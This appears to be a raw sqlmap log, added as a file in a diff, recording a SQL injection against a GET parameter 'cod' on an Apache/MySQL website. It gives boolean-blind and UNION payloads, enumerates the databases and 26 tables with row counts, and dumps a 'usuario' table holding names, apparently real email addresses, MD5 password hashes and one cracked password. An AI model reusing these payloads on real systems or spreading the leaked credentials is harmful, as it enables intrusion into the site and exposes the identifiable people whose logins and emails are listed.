@@ -1,0 +1,121 @@
+sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=33 AND 1267=1267
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: cod=33 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a6b6a71,0x6e5165436e59444955737379674370414b66787a44457470616a726d6e78727044756c454e67636b,0x7178706271),NULL,NULL,NULL-- nBPj
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] information_schema
+[*] site13909345091
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=33 AND 1267=1267
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: cod=33 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a6b6a71,0x6e5165436e59444955737379674370414b66787a44457470616a726d6e78727044756c454e67636b,0x7178706271),NULL,NULL,NULL-- nBPj
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL 5
+Database: site13909345091
+[26 tables]
++--------------------+
+| contato_tipos      |
+| extranet_arquivo   |
+| extranet_evento    |
+| extranet_reserva   |
+| log_acesso         |
+| newsletter         |
+| newsletter_noticia |
+| perfil             |
+| perfil_secao       |
+| secao              |
+| site_banner        |
+| site_cadastro      |
+| site_calendario    |
+| site_chamada       |
+| site_cliente       |
+| site_ecopousada    |
+| site_estrutura     |
+| site_hospedagem    |
+| site_noticia       |
+| site_pacote        |
+| site_palestra      |
+| site_parceiro      |
+| site_tarifa        |
+| site_turma         |
+| usuario            |
+| zbox               |
++--------------------+
+
+Database: site13909345091
++------------------+---------+
+| Table            | Entries |
++------------------+---------+
+| site_cadastro    | 3309    |
+| log_acesso       | 515     |
+| extranet_reserva | 231     |
+| extranet_evento  | 208     |
+| site_turma       | 65      |
+| perfil_secao     | 61      |
+| site_calendario  | 60      |
+| site_noticia     | 30      |
+| secao            | 22      |
+| contato_tipos    | 16      |
+| site_estrutura   | 14      |
+| zbox             | 12      |
+| site_cliente     | 10      |
+| site_tarifa      | 10      |
+| site_ecopousada  | 6       |
+| site_chamada     | 5       |
+| site_hospedagem  | 5       |
+| site_parceiro    | 5       |
+| site_banner      | 4       |
+| site_pacote      | 4       |
+| site_palestra    | 4       |
+| usuario          | 4       |
+| perfil           | 3       |
++------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=33 AND 1267=1267
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: cod=33 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a6b6a71,0x6e5165436e59444955737379674370414b66787a44457470616a726d6e78727044756c454e67636b,0x7178706271),NULL,NULL,NULL-- nBPj
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL 5
+Database: site13909345091
+Table: usuario
+[4 entries]
++----------------+---------------------------------------------+--------------------------------+--------+--------+--------+
+| nome           | senha                                       | email                          | status | perfil | codigo |
++----------------+---------------------------------------------+--------------------------------+--------+--------+--------+
+| ZAITE          | 60bbc8b1a88d43aeaee49105fc50cd0b            | zaitepronto@zaite.com.br       | SIM    | 1      | 1      |
+| Luciano Paiva  | 9dc984ff8edef9b4ce3d74c528ba9b9c            | contato@academiameteora.com.br | SIM    | 2      | 3      |
+| ROBERTA GALVAO | NULL                                        | galvao.roberta@hotmail.com     | SIM    | 2      | 6      |
+| Claudia Paiva  | 296506902c693b458707ad6f7e24a544 (MTIzNA==) | claudia@academiameteora.com.br | SIM    | 2      | 5      |
++----------------+---------------------------------------------+--------------------------------+--------+--------+--------+
+
